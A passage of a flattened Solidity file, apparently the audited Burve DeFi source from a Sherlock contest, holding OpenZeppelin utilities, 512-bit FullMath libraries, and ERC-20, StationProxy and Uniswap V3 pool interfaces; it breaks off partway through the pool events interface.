// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

// ===== BEGIN: flattened REAL audited Burve source (single/Burve.sol @ sherlock 2025-04-burve, commit 44cba36) =====

// lib/openzeppelin-contracts/contracts/utils/Context.sol

// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}

// lib/openzeppelin-contracts/contracts/utils/Errors.sol

// OpenZeppelin Contracts (last updated v5.1.0) (utils/Errors.sol)

/**
 * @dev Collection of common custom errors used in multiple contracts
 *
 * IMPORTANT: Backwards compatibility is not guaranteed in future versions of the library.
 * It is recommended to avoid relying on the error API for critical functionality.
 *
 * _Available since v5.1._
 */
library Errors {
    /**
     * @dev The ETH balance of the account is not enough to perform the operation.
     */
    error InsufficientBalance(uint256 balance, uint256 needed);

    /**
     * @dev A call to an address target failed. The target may have reverted.
     */
    error FailedCall();

    /**
     * @dev The deployment failed.
     */
    error FailedDeployment();

    /**
     * @dev A necessary precompile is missing.
     */
    error MissingPrecompile(address);
}

// lib/v3-core/contracts/libraries/FixedPoint96.sol

/// @title FixedPoint96
/// @notice A library for handling binary fixed point numbers, see https://en.wikipedia.org/wiki/Q_(number_format)
/// @dev Used in SqrtPriceMath.sol
library FixedPoint96 {
    uint8 internal constant RESOLUTION = 96;
    uint256 internal constant Q96 = 0x1000000000000000000000000;
}

// lib/Commons/src/Math/FullMath.sol

/// @title Contains 512-bit math functions
/// @author Uniswap Team
/// @notice Facilitates multiplication and division that can have overflow of an
/// intermediate value without any loss of precision
/// @dev Handles "phantom overflow" i.e., allows multiplication and division where an intermediate
/// value overflows 256 bits
library FullMath_0 {
    /// Thrown when we try to safeMul512X two numbers that we expect to fit in a 256
    /// after shifting xBits out, but won't.
    error Oversized(uint256 a, uint256 b, uint8 xBits);

    /// @notice Calculates floor(a×b÷denominator) with full precision.
    /// Throws if result overflows a uint256 or denominator == 0
    /// @param a The multiplicand
    /// @param b The multiplier
    /// @param denominator The divisor
    /// @return result The 256-bit result
    /// @dev Credit to Remco Bloemen under MIT license https://xn--2-umb.com/21/muldiv
    function mulDiv(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256 result) {
        // 512-bit multiply [prod1 prod0] = a * b
        // Compute the product mod 2**256 and mod 2**256 - 1
        // then use the Chinese Remainder Theorem to reconstruct
        // the 512 bit result. The result is stored in two 256
        // variables such that product = prod1 * 2**256 + prod0
        uint256 prod0; // Least significant 256 bits of the product
        uint256 prod1; // Most significant 256 bits of the product
        assembly {
            let mm := mulmod(a, b, not(0))
            prod0 := mul(a, b)
            prod1 := sub(sub(mm, prod0), lt(mm, prod0))
        }

        // Handle non-overflow cases, 256 by 256 division
        if (prod1 == 0) {
            require(denominator > 0);
            assembly {
                result := div(prod0, denominator)
            }
            return result;
        }

        // Make sure the result is less than 2**256.
        // Also prevents denominator == 0
        require(denominator > prod1);

        ///////////////////////////////////////////////
        // 512 by 256 division.
        ///////////////////////////////////////////////

        // Make division exact by subtracting the remainder from [prod1 prod0]
        // Compute remainder using mulmod
        uint256 remainder;
        assembly {
            remainder := mulmod(a, b, denominator)
        }
        // Subtract 256 bit number from 512 bit number
        assembly {
            prod1 := sub(prod1, gt(remainder, prod0))
            prod0 := sub(prod0, remainder)
        }

        // Factor powers of two out of denominator
        // Compute largest power of two divisor of denominator.
        // Always >= 1.
        uint256 twos = uint256(-int256(denominator)) & denominator;
        // Divide denominator by power of two
        assembly {
            denominator := div(denominator, twos)
        }

        // Divide [prod1 prod0] by the factors of two
        assembly {
            prod0 := div(prod0, twos)
        }
        // Shift in bits from prod1 into prod0. For this we need
        // to flip `twos` such that it is 2**256 / twos.
        // If twos is zero, then it becomes one
        assembly {
            twos := add(div(sub(0, twos), twos), 1)
        }
        unchecked {
            prod0 |= prod1 * twos;

            // Invert denominator mod 2**256
            // Now that denominator is an odd number, it has an inverse
            // modulo 2**256 such that denominator * inv = 1 mod 2**256.
            // Compute the inverse by starting with a seed that is correct
            // correct for four bits. That is, denominator * inv = 1 mod 2**4

            uint256 inv = (3 * denominator) ^ 2;
            // Now use Newton-Raphson iteration to improve the precision.
            // Thanks to Hensel's lifting lemma, this also works in modular
            // arithmetic, doubling the correct bits in each step.
            inv *= 2 - denominator * inv; // inverse mod 2**8
            inv *= 2 - denominator * inv; // inverse mod 2**16
            inv *= 2 - denominator * inv; // inverse mod 2**32
            inv *= 2 - denominator * inv; // inverse mod 2**64
            inv *= 2 - denominator * inv; // inverse mod 2**128
            inv *= 2 - denominator * inv; // inverse mod 2**256

            // Because the division is now exact we can divide by multiplying
            // with the modular inverse of denominator. This will give us the
            // correct result modulo 2**256. Since the precoditions guarantee
            // that the outcome is less than 2**256, this is the final result.
            // We don't need to compute the high bits of the result and prod1
            // is no longer required.
            result = prod0 * inv;
        }
        return result;
    }

    /// @notice Calculates ceil(a×b÷denominator) with full precision.
    /// Throws if result overflows a uint256 or denominator == 0
    /// @param a The multiplicand
    /// @param b The multiplier
    /// @param denominator The divisor
    /// @return result The 256-bit result
    function mulDivRoundingUp(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256 result) {
        result = mulDiv(a, b, denominator);
        if (mulmod(a, b, denominator) > 0) {
            require(result < type(uint256).max);
            result++;
        }
    }

    /// Calculates a 512 bit product of two 256 bit numbers.
    /// @return r0 The lower 256 bits of the result.
    /// @return r1 The higher 256 bits of the result.
    function mul512(uint256 a, uint256 b) internal pure returns (uint256 r0, uint256 r1) {
        assembly {
            let mm := mulmod(a, b, not(0))
            r0 := mul(a, b)
            r1 := sub(sub(mm, r0), lt(mm, r0))
        }
    }

    /// Short circuit mulDiv if the multiplicands don't overflow.
    /// Use this when you expect the input values to be small in most cases.
    /// @dev This charges an extra ~20 gas on top of the regular mulDiv if used, but otherwise costs 30 gas
    function shortMulDiv(uint256 m0, uint256 m1, uint256 denominator) internal pure returns (uint256 result) {
        uint256 num;
        unchecked {
            num = m0 * m1;
        }
        if (num == 0) return 0;

        unchecked {
            if (num / m0 == m1) {
                return num / denominator;
            } else {
                return mulDiv(m0, m1, denominator);
            }
        }
    }

    /// A mul512 that is expected to fit in a uint256 once the bottom X bits have been dropped.
    /// @dev Not gas-optimized yet.
    function safeMul512X(uint256 a, uint256 b, uint8 xBits, bool roundUp) internal pure returns (uint256 res) {
        (uint256 rawB, uint256 rawT) = mul512(a, b);
        if ((rawT >> xBits) > 0) revert Oversized(a, b, xBits);
        res = (rawB >> xBits) + (rawT << (256 - xBits));
        if (roundUp && ((rawB % (1 << xBits)) > 0)) res += 1;
    }
}

// src/FullMath.sol

/// @title Contains 512-bit math functions
/// @author Uniswap Team
/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision
/// @dev Handles "phantom overflow" i.e., allows multiplication and division where an intermediate value overflows 256 bits
library FullMath_1 {
    uint256 constant X128 = 1 << 128;

    /// @notice Calculates floor(a×b÷denominator) with full precision. Throws if result overflows a uint256 or denominator == 0
    /// @param a The multiplicand
    /// @param b The multiplier
    /// @param denominator The divisor
    /// @return result The 256-bit result
    /// @dev Credit to Remco Bloemen under MIT license https://xn--2-umb.com/21/muldiv
    function mulDiv(
        uint256 a,
        uint256 b,
        uint256 denominator
    ) internal pure returns (uint256 result) {
        // 512-bit multiply [prod1 prod0] = a * b
        // Compute the product mod 2**256 and mod 2**256 - 1
        // then use the Chinese Remainder Theorem to reconstruct
        // the 512 bit result. The result is stored in two 256
        // variables such that product = prod1 * 2**256 + prod0
        uint256 prod0; // Least significant 256 bits of the product
        uint256 prod1; // Most significant 256 bits of the product
        assembly {
            let mm := mulmod(a, b, not(0))
            prod0 := mul(a, b)
            prod1 := sub(sub(mm, prod0), lt(mm, prod0))
        }

        // Handle non-overflow cases, 256 by 256 division
        if (prod1 == 0) {
            require(denominator > 0);
            assembly {
                result := div(prod0, denominator)
            }
            return result;
        }

        // Make sure the result is less than 2**256.
        // Also prevents denominator == 0
        require(denominator > prod1);

        ///////////////////////////////////////////////
        // 512 by 256 division.
        ///////////////////////////////////////////////

        // Make division exact by subtracting the remainder from [prod1 prod0]
        // Compute remainder using mulmod
        uint256 remainder;
        assembly {
            remainder := mulmod(a, b, denominator)
        }
        // Subtract 256 bit number from 512 bit number
        assembly {
            prod1 := sub(prod1, gt(remainder, prod0))
            prod0 := sub(prod0, remainder)
        }

        // Factor powers of two out of denominator
        // Compute largest power of two divisor of denominator.
        // Always >= 1.
        uint256 twos = uint256(-int256(denominator)) & denominator;
        // Divide denominator by power of two
        assembly {
            denominator := div(denominator, twos)
        }

        // Divide [prod1 prod0] by the factors of two
        assembly {
            prod0 := div(prod0, twos)
        }
        // Shift in bits from prod1 into prod0. For this we need
        // to flip `twos` such that it is 2**256 / twos.
        // If twos is zero, then it becomes one
        assembly {
            twos := add(div(sub(0, twos), twos), 1)
        }
        unchecked {
            prod0 |= prod1 * twos;

            // Invert denominator mod 2**256
            // Now that denominator is an odd number, it has an inverse
            // modulo 2**256 such that denominator * inv = 1 mod 2**256.
            // Compute the inverse by starting with a seed that is correct
            // correct for four bits. That is, denominator * inv = 1 mod 2**4

            uint256 inv = (3 * denominator) ^ 2;
            // Now use Newton-Raphson iteration to improve the precision.
            // Thanks to Hensel's lifting lemma, this also works in modular
            // arithmetic, doubling the correct bits in each step.
            inv *= 2 - denominator * inv; // inverse mod 2**8
            inv *= 2 - denominator * inv; // inverse mod 2**16
            inv *= 2 - denominator * inv; // inverse mod 2**32
            inv *= 2 - denominator * inv; // inverse mod 2**64
            inv *= 2 - denominator * inv; // inverse mod 2**128
            inv *= 2 - denominator * inv; // inverse mod 2**256

            // Because the division is now exact we can divide by multiplying
            // with the modular inverse of denominator. This will give us the
            // correct result modulo 2**256. Since the precoditions guarantee
            // that the outcome is less than 2**256, this is the final result.
            // We don't need to compute the high bits of the result and prod1
            // is no longer required.
            result = prod0 * inv;
        }
        return result;
    }

    /// @notice Calculates ceil(a×b÷denominator) with full precision. Throws if result overflows a uint256 or denominator == 0
    /// @param a The multiplicand
    /// @param b The multiplier
    /// @param denominator The divisor
    /// @return result The 256-bit result
    function mulDivRoundingUp(
        uint256 a,
        uint256 b,
        uint256 denominator
    ) internal pure returns (uint256 result) {
        result = mulDiv(a, b, denominator);
        if (mulmod(a, b, denominator) > 0) {
            require(result < type(uint256).max);
            result++;
        }
    }

    /// A slightly optimized version of mulDiv for when we want to divide a by b (where b > a) and get an X256 result.
    /// @custom:gas 548
    function mulDivX256(
        uint256 num,
        uint256 denominator,
        bool roundUp
    ) internal pure returns (uint256 result) {
        require(denominator > num, "0");

        ///////////////////////////////////////////////
        // 512 by 256 division.
        ///////////////////////////////////////////////

        // Make division exact by subtracting out the remainder.
        uint256 remainder;
        assembly {
            remainder := mulmod(num, X128, denominator)
            remainder := mulmod(remainder, X128, denominator)
        }
        roundUp = roundUp && (remainder > 0);
        // Subtract out the remainder. Now remainder holds the fractional portion.
        assembly {
            num := sub(num, gt(remainder, 0))
            remainder := sub(0, remainder)
        }
        // Factor powers of two out of denominator
        // Compute largest power of two divisor of denominator.
        // Always >= 1.
        uint256 twos = uint256(-int256(denominator)) & denominator;
        assembly {
            remainder := div(remainder, twos)
        }
        assembly {
            denominator := div(denominator, twos)
        }

        // Shift in bits from the whole into the fraction. For this we need
        // to flip `twos` such that it is 2**256 / twos.
        // If twos is zero, then it becomes one
        assembly {
            twos := add(div(sub(0, twos), twos), 1)
        }
        unchecked {
            remainder |= num * twos;

            // Follow Remco Bloeman's inversion process.
            uint256 inv = (3 * denominator) ^ 2;
            inv *= 2 - denominator * inv; // inverse mod 2**8
            inv *= 2 - denominator * inv; // inverse mod 2**16
            inv *= 2 - denominator * inv; // inverse mod 2**32
            inv *= 2 - denominator * inv; // inverse mod 2**64
            inv *= 2 - denominator * inv; // inverse mod 2**128
            inv *= 2 - denominator * inv; // inverse mod 2**256
            // We know the result is entirely fractional.
            result = remainder * inv;
        }
        if (roundUp) result += 1;
        return result;
    }

    /// Calculates a 512 bit product of two 256 bit numbers.
    /// @return r0 The lower 256 bits of the result.
    /// @return r1 The higher 256 bits of the result.
    function mul512(
        uint256 a,
        uint256 b
    ) internal pure returns (uint256 r0, uint256 r1) {
        assembly {
            let mm := mulmod(a, b, not(0))
            r0 := mul(a, b)
            r1 := sub(sub(mm, r0), lt(mm, r0))
        }
    }

    /// Short circuit mulDiv if the multiplicands don't overflow.
    /// Use this when you expect the input values to be small in most cases.
    /// @dev This charges an extra ~20 gas on top of the regular mulDiv if used, but otherwise costs 30 gas
    function shortMulDiv(
        uint256 m0,
        uint256 m1,
        uint256 denominator
    ) internal pure returns (uint256 result) {
        uint256 num;
        unchecked {
            num = m0 * m1;
        }
        if (num == 0) return 0;

        unchecked {
            if (num / m0 == m1) {
                return num / denominator;
            } else {
                return mulDiv(m0, m1, denominator);
            }
        }
    }

    /// Multiply two numbers and divide out by 128 bits to get a 256 bit number.
    /// @dev Be careful when using this. If there is overflow you won't be warned.
    function mulX128(
        uint256 a,
        uint256 b,
        bool roundUp
    ) internal pure returns (uint256 res) {
        (uint256 bot, uint256 top) = FullMath_1.mul512(a, b);
        uint256 modmax = 1 << 128;
        assembly {
            res := add(
                add(shr(128, bot), shl(128, top)),
                and(roundUp, gt(mod(bot, modmax), 0))
            )
        }
    }

    /// Multiply two 256 bit number and shift the result by 256
    function mulX256(
        uint256 a,
        uint256 b,
        bool roundUp
    ) internal pure returns (uint256) {
        (uint256 bot, uint256 top) = FullMath_1.mul512(a, b);
        if (roundUp && bot > 0) top += 1;
        return top;
    }
}

// lib/Commons/src/ERC/interfaces/IERC165.sol

interface IERC165_0 {
    /// @notice Query if a contract implements an interface
    /// @param interfaceId The interface identifier, as specified in ERC-165
    /// @dev Interface identification is specified in ERC-165. This function
    ///  uses less than 30,000 gas.
    /// @return `true` if the contract implements `interfaceID` and
    ///  `interfaceID` is not 0xffffffff, `false` otherwise
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}

// lib/openzeppelin-contracts/contracts/utils/introspection/IERC165.sol

// OpenZeppelin Contracts (last updated v5.1.0) (utils/introspection/IERC165.sol)

/**
 * @dev Interface of the ERC-165 standard, as defined in the
 * https://eips.ethereum.org/EIPS/eip-165[ERC].
 *
 * Implementers can declare support of contract interfaces, which can then be
 * queried by others ({ERC165Checker}).
 *
 * For an implementation, see {ERC165}.
 */
interface IERC165_1 {
    /**
     * @dev Returns true if this contract implements the interface defined by
     * `interfaceId`. See the corresponding
     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[ERC section]
     * to learn more about how these ids are created.
     *
     * This function call must use less than 30 000 gas.
     */
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}

// lib/Commons/src/ERC/interfaces/IERC173.sol

/// @title ERC-173 Contract Ownership Standard
///  Note: the ERC-165 identifier for this interface is 0x7f5828d0
/* is ERC165 */
interface IERC173 {
    /// @dev This emits when ownership of a contract changes.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /// @notice Get the address of the owner
    /// @return owner_ The address of the owner.
    function owner() external view returns (address owner_);

    /// @notice Set the address of the new owner of the contract
    /// @dev Set _newOwner to address(0) to renounce any ownership.
    /// @param _newOwner The address of the new owner of the contract
    function transferOwnership(address _newOwner) external;
}

// lib/forge-std/src/interfaces/IERC20.sol

/// @dev Interface of the ERC20 standard as defined in the EIP.
/// @dev This includes the optional name, symbol, and decimals metadata.
interface IERC20_0 {
    /// @dev Emitted when `value` tokens are moved from one account (`from`) to another (`to`).
    event Transfer(address indexed from, address indexed to, uint256 value);

    /// @dev Emitted when the allowance of a `spender` for an `owner` is set, where `value`
    /// is the new allowance.
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /// @notice Returns the amount of tokens in existence.
    function totalSupply() external view returns (uint256);

    /// @notice Returns the amount of tokens owned by `account`.
    function balanceOf(address account) external view returns (uint256);

    /// @notice Moves `amount` tokens from the caller's account to `to`.
    function transfer(address to, uint256 amount) external returns (bool);

    /// @notice Returns the remaining number of tokens that `spender` is allowed
    /// to spend on behalf of `owner`
    function allowance(address owner, address spender) external view returns (uint256);

    /// @notice Sets `amount` as the allowance of `spender` over the caller's tokens.
    /// @dev Be aware of front-running risks: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
    function approve(address spender, uint256 amount) external returns (bool);

    /// @notice Moves `amount` tokens from `from` to `to` using the allowance mechanism.
    /// `amount` is then deducted from the caller's allowance.
    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    /// @notice Returns the name of the token.
    function name() external view returns (string memory);

    /// @notice Returns the symbol of the token.
    function symbol() external view returns (string memory);

    /// @notice Returns the decimals places of the token.
    function decimals() external view returns (uint8);
}

// lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol

// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/IERC20.sol)

/**
 * @dev Interface of the ERC-20 standard as defined in the ERC.
 */
interface IERC20_1 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

// src/single/IStationProxy.sol

/***
    @notice Station Proxy manages BGT earning and allocation for all of Burve and Burve integrated products.

    Burve protocols typically interact with two LP Tokens: 1. The LP token it issues 2. LP Tokens issued to it
    from protocols it uses.
    The protocols send the second type of LP tokens to the station proxy so it can earn BGT on its behalf.

    Protocols do not receive back the earnings from the LP tokens it gives to station proxy directly.
    They are instead claimed by the user from the station proxy. This is why LP tokens should be ascribed an owner,
    indicating who can claim the rewards from those LP tokens.

    Exactly how the station proxy directs rewards and BGT earnings is complex and subject to governance.
***/
interface IStationProxy {
    /// Called by a user to harvest rewards owed to them from lptoken deposits they own.
    function harvest() external;

    /// Called by a burve protocol to deposit LPtokens on behalf of a owner and accrue rewards for them.
    /// @param lpToken The token being deposited
    /// @param amount The amount of token to be deposited
    /// @param owner Who "owns" the lp tokens and who the rewards earned by the lpToken should be claimable by.
    function depositLP(address lpToken, uint256 amount, address owner) external;

    /// Called by a burve protocol to withdraw lptokens on behalf of a owner.
    /// @param lpToken The token being withdrawn
    /// @param amount The amount of token to be withdrawn
    /// @param owner Which owners account we should withdraw these lp tokens from.
    function withdrawLP(
        address lpToken,
        uint256 amount,
        address owner
    ) external;

    /// The allowance of LP token the spender is allowed to transfer on behalf of the owner.
    /// @param spender The spender
    /// @param lpToken The LP token
    /// @param owner The owner of the LP token
    /// @return _allowance The amount of LP token the spender is allowed to transfer on behalf of the owner.
    function allowance(
        address spender,
        address lpToken,
        address owner
    ) external view returns (uint256 _allowance);

    /// Moves existing deposits to a new station proxy.
    function migrate(IStationProxy newStationProxy) external;
}

// src/single/integrations/kodiak/pool/IUniswapV3MintCallback.sol

/// @title Callback for IUniswapV3PoolActions#mint
/// @notice Any contract that calls IUniswapV3PoolActions#mint must implement this interface
interface IUniswapV3MintCallback {
    /// @notice Called to `msg.sender` after minting liquidity to a position from IUniswapV3Pool#mint.
    /// @dev In the implementation you must pay the pool tokens owed for the minted liquidity.
    /// The caller of this method must be checked to be a UniswapV3Pool deployed by the canonical UniswapV3Factory.
    /// @param amount0Owed The amount of token0 due to the pool for the minted liquidity
    /// @param amount1Owed The amount of token1 due to the pool for the minted liquidity
    /// @param data Any data passed through by the caller via the IUniswapV3PoolActions#mint call
    function uniswapV3MintCallback(
        uint256 amount0Owed,
        uint256 amount1Owed,
        bytes calldata data
    ) external;
}

// src/single/integrations/kodiak/pool/IUniswapV3PoolActions.sol

/// @title Permissionless pool actions
/// @notice Contains pool methods that can be called by anyone
interface IUniswapV3PoolActions {
    /// @notice Sets the initial price for the pool
    /// @dev Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value
    /// @param sqrtPriceX96 the initial sqrt price of the pool as a Q64.96
    function initialize(uint160 sqrtPriceX96) external;

    /// @notice Adds liquidity for the given recipient/tickLower/tickUpper position
    /// @dev The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback
    /// in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends
    /// on tickLower, tickUpper, the amount of liquidity, and the current price.
    /// @param recipient The address for which the liquidity will be created
    /// @param tickLower The lower tick of the position in which to add liquidity
    /// @param tickUpper The upper tick of the position in which to add liquidity
    /// @param amount The amount of liquidity to mint
    /// @param data Any data that should be passed through to the callback
    /// @return amount0 The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback
    /// @return amount1 The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback
    function mint(
        address recipient,
        int24 tickLower,
        int24 tickUpper,
        uint128 amount,
        bytes calldata data
    ) external returns (uint256 amount0, uint256 amount1);

    /// @notice Collects tokens owed to a position
    /// @dev Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity.
    /// Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or
    /// amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the
    /// actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.
    /// @param recipient The address which should receive the fees collected
    /// @param tickLower The lower tick of the position for which to collect fees
    /// @param tickUpper The upper tick of the position for which to collect fees
    /// @param amount0Requested How much token0 should be withdrawn from the fees owed
    /// @param amount1Requested How much token1 should be withdrawn from the fees owed
    /// @return amount0 The amount of fees collected in token0
    /// @return amount1 The amount of fees collected in token1
    function collect(
        address recipient,
        int24 tickLower,
        int24 tickUpper,
        uint128 amount0Requested,
        uint128 amount1Requested
    ) external returns (uint128 amount0, uint128 amount1);

    /// @notice Burn liquidity from the sender and account tokens owed for the liquidity to the position
    /// @dev Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0
    /// @dev Fees must be collected separately via a call to #collect
    /// @param tickLower The lower tick of the position for which to burn liquidity
    /// @param tickUpper The upper tick of the position for which to burn liquidity
    /// @param amount How much liquidity to burn
    /// @return amount0 The amount of token0 sent to the recipient
    /// @return amount1 The amount of token1 sent to the recipient
    function burn(
        int24 tickLower,
        int24 tickUpper,
        uint128 amount
    ) external returns (uint256 amount0, uint256 amount1);

    /// @notice Swap token0 for token1, or token1 for token0
    /// @dev The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback
    /// @param recipient The address to receive the output of the swap
    /// @param zeroForOne The direction of the swap, true for token0 to token1, false for token1 to token0
    /// @param amountSpecified The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)
    /// @param sqrtPriceLimitX96 The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this
    /// value after the swap. If one for zero, the price cannot be greater than this value after the swap
    /// @param data Any data to be passed through to the callback
    /// @return amount0 The delta of the balance of token0 of the pool, exact when negative, minimum when positive
    /// @return amount1 The delta of the balance of token1 of the pool, exact when negative, minimum when positive
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);

    /// @notice Receive token0 and/or token1 and pay it back, plus a fee, in the callback
    /// @dev The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallback
    /// @dev Can be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling
    /// with 0 amount{0,1} and sending the donation amount(s) from the callback
    /// @param recipient The address which will receive the token0 and token1 amounts
    /// @param amount0 The amount of token0 to send
    /// @param amount1 The amount of token1 to send
    /// @param data Any data to be passed through to the callback
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;

    /// @notice Increase the maximum number of price and liquidity observations that this pool will store
    /// @dev This method is no-op if the pool already has an observationCardinalityNext greater than or equal to
    /// the input observationCardinalityNext.
    /// @param observationCardinalityNext The desired minimum number of observations for the pool to store
    function increaseObservationCardinalityNext(
        uint16 observationCardinalityNext
    ) external;
}

// src/single/integrations/kodiak/pool/IUniswapV3PoolDerivedState.sol

/// @title Pool state that is not stored
/// @notice Contains view functions to provide information about the pool that is computed rather than stored on the
/// blockchain. The functions here may have variable gas costs.
interface IUniswapV3PoolDerivedState {
    /// @notice Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp
    /// @dev To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing
    /// the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick,
    /// you must call it with secondsAgos = [3600, 0].
    /// @dev The time weighted average tick represents the geometric time weighted average price of the pool, in
    /// log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.
    /// @param secondsAgos From how long ago each cumulative tick and liquidity value should be returned
    /// @return tickCumulatives Cumulative tick values as of each `secondsAgos` from the current block timestamp
    /// @return secondsPerLiquidityCumulativeX128s Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block
    /// timestamp
    function observe(uint32[] calldata secondsAgos)
        external
        view
        returns (int56[] memory tickCumulatives, uint160[] memory secondsPerLiquidityCumulativeX128s);

    /// @notice Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range
    /// @dev Snapshots must only be compared to other snapshots, taken over a period for which a position existed.
    /// I.e., snapshots cannot be compared if a position is not held for the entire period between when the first
    /// snapshot is taken and the second snapshot is taken.
    /// @param tickLower The lower tick of the range
    /// @param tickUpper The upper tick of the range
    /// @return tickCumulativeInside The snapshot of the tick accumulator for the range
    /// @return secondsPerLiquidityInsideX128 The snapshot of seconds per liquidity for the range
    /// @return secondsInside The snapshot of seconds per liquidity for the range
    function snapshotCumulativesInside(int24 tickLower, int24 tickUpper)
        external
        view
        returns (int56 tickCumulativeInside, uint160 secondsPerLiquidityInsideX128, uint32 secondsInside);
}

// src/single/integrations/kodiak/pool/IUniswapV3PoolEvents.sol

/// @title Events emitted by a pool
/// @notice Contains all events emitted by the pool
interface IUniswapV3PoolEvents {
    /// @notice Emitted exactly once by a pool when #initialize is first called on the pool
    /// @dev Mint/Burn/Swap cannot be emitted by the pool before Initialize
    /// @param sqrtPriceX96 The initial sqrt price of the pool, as a Q64.96
    /// @param tick The initial tick of the pool, i.e. log base 1.0001 of the starting price of the pool
    event Initialize(uint160 sqrtPriceX96, int24 tick);

    /// @notice Emitted when liquidity is minted for a given position
    /// @param sender The address that minted the liquidity
    /// @param owner The owner of the position and recipient of any minted liquidity
    /// @param tickLower The lower tick of the position
    /// @param tickUpper The upper tick of the position
    /// @param amount The amount of liquidity minted to the position range
    /// @param amount0 How much token0 was required for the minted liquidity
    /// @param amount1 How much token1 was required for the minted liquidity
    event Mint(
        address sender,
        address indexed owner,
        int24 indexed tickLower,
        int24 indexed tickUpper,
        uint128 amount,
        uint256 amount0,
        uint256 amount1
    );

    /// @notice Emitted when fees are collected by the owner of a position
    /// @dev Collect events may be emitted with zero amount0 and amount1 when the caller chooses not to collect fees
    /// @param owner The owner of the position for which fees are collected
    /// @param tickLower The lower tick of the position
    /// @param tickUpper The upper tick of the position
    /// @param amount0 The amount of token0 fees collected
    /// @param amount1 The amount of token1 fees collected
    event Collect(
        address indexed owner,
        address recipient,
        int24 indexed tickLower,
        int24 indexed tickUpper,
        uint128 amount0,
        uint128 amount1
    );

    /// @notice Emitted when a position's liquidity is removed
    /// @dev Does not withdraw any fees earned by the liquidity position, which must be withdrawn via #collect
    /// @param owner The owner of the position for which liquidity is removed
    /// @param tickLower The lower tick of the position
    /// @param tickUpper The upper tick of the position
    /// @param amount The amount of liquidity to remove
    /// @param amount0 The amount of token0 withdrawn
    /// @param amount1 The amount of token1 withdrawn
    event Burn(
        address indexed owner,
        int24 indexed tickLower,
        int24 indexed tickUpper,
        uint128 amount,
        uint256 amount0,
        uint256 amount1
    );

    /// @notice Emitted by the pool for any swaps between token0 and token1
